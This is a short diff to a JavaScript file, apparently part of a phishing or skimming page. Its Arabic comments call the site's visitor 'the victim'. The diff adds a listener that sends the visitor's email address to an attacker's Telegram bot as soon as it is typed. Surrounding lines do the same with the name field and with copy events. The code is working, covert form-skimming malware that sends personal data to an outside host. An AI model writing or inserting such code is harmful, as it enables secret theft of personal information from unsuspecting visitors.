@@ -145,6 +145,12 @@ document.getElementById('name').addEventListener('change', (e) => {
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📝 الضحية كتب في خانة الاسم: " + e.target.value)}`);
     }
 });
+// 📧 محقّق البريد الإلكتروني (يسحب الإيميل فور كتابته)
+document.getElementById('email').addEventListener('change', (e) => {
+    if(e.target.value.length > 5) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📧 الضحية كتب إيميله: " + e.target.value)}`);
+    }
+});
 
 document.addEventListener('copy', () => {
     fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
